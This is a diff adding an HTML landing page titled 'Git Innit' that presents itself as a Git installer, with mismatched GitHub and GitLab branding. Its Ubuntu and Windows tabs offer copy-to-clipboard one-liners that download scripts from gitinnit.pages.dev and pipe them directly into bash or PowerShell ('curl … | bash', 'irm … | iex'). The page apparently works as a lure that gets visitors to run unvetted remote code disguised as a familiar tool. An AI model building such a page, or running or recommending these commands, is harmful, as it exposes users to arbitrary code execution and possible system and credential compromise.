@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Git Innit</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0b1220;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 100px;
+            color: #e5e7eb;
+        }
+
+        .header-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 5px;
+        }
+
+        h1 {
+            font-size: 42px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            color: #f9fafb;
+        }
+
+        .version-badge {
+            background-color: #064e3b;
+            color: #a7f3d0;
+            font-size: 24px;
+            font-weight: bold;
+            padding: 4px 12px;
+            border-radius: 4px;
+        }
+
+        .release-link {
+            color: #9ca3af;
+            font-size: 16px;
+            text-decoration: underline;
+            margin-bottom: 60px;
+            cursor: pointer;
+        }
+
+        .tab-container {
+            width: 760px;
+            border: 1px solid #1f2937;
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+            overflow: hidden;
+            background: #0f172a;
+        }
+
+        .tab-headers {
+            display: flex;
+            background-color: #0b1220;
+            border-bottom: 1px solid #1f2937;
+        }
+
+        .tab-button {
+            flex: 1;
+            padding: 14px 0;
+            font-size: 14px;
+            color: #9ca3af;
+            background: none;
+            border: none;
+            cursor: pointer;
+            text-align: center;
+            font-weight: 500;
+        }
+
+        .tab-button.active {
+            color: #f9fafb;
+            background-color: #0f172a;
+            font-weight: 600;
+        }
+
+        .tab-button:first-child {
+            border-right: 1px solid #1f2937;
+        }
+
+        .tab-content {
+            background-color: #0f172a;
+            padding: 35px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .command-line {
+            display: flex;
+            align-items: center;
+            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
+            font-size: 16px;
+            color: #f9fafb;
+            word-break: break-word;
+            overflow-wrap: anywhere;
+        }
+
+        .prompt-symbol {
+            color: #34d399;
+            margin-right: 15px;
+            font-weight: bold;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        .copy-button {
+            background: none;
+            border: 1px solid #1f2937;
+            border-radius: 6px;
+            padding: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.2s, border-color 0.2s;
+        }
+
+        .copy-button:hover {
+            background-color: #111c33;
+            border-color: #334155;
+        }
+
+        .copy-icon {
+            width: 18px;
+            height: 18px;
+            fill: none;
+            stroke: #9ca3af;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .gitlab-logo {
+            width: 242px;
+            height: 242px;
+            object-fit: contain;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="header-container">
+        <img class="gitlab-logo" src="https://brand.github.com/_next/static/media/logo-03.cc5e5332.png"
+            alt="GitLab Logo">
+        <br />
+        <h1>Git Init</h1>
+        <div class="version-badge"> > </div>
+    </div>
+
+
+    <a class="release-link"> </a>
+
+    <div class="tab-container">
+        <div class="tab-headers">
+            <button class="tab-button" onclick="switchTab('linux')">Ubuntu</button>
+            <button class="tab-button active" onclick="switchTab('windows')">Windows</button>
+        </div>
+        <div class="tab-content">
+            <div class="command-line">
+                <span class="prompt-symbol">$</span>
+                <span id="command-text">irm https://gitinnit.pages.dev/win | iex</span>
+            </div>
+            <button class="copy-button" onclick="copyCommand()" title="Copy to clipboard">
+                <svg class="copy-icon" viewBox="0 0 24 24">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const commands = {
+            linux: "curl -sSL https://gitinnit.pages.dev/setup.sh | bash",
+            windows: "irm https://gitinnit.pages.dev/setup.ps1 | iex"
+        };
+
+        function switchTab(platform) {
+            document.getElementById('command-text').innerText = commands[platform];
+
+            const buttons = document.querySelectorAll('.tab-button');
+            buttons.forEach(btn => btn.classList.remove('active'));
+
+            if (platform === 'linux') {
+                buttons[0].classList.add('active');
+            } else {
+                buttons[1].classList.add('active');
+            }
+        }
+
+        function copyCommand() {
+            const text = document.getElementById('command-text').innerText;
+            navigator.clipboard.writeText(text);
+        }
+    </script>
+
+</body>
+
+</html>
